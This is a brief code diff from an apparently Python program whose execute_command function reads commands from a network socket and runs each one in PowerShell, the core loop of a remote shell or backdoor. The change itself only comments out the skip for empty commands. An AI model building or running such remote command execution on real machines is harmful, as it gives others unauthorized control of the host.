@@ -11,8 +11,8 @@ def execute_command(my_socket):
 
         if user_command == "stop":
             break
-        if user_command == "":
-            continue
+        # if user_command == "":
+        #     continue
 
         output = subprocess.run(["powershell", user_command], shell=True, capture_output=True)
         if output.stderr.decode('utf-8') == "":
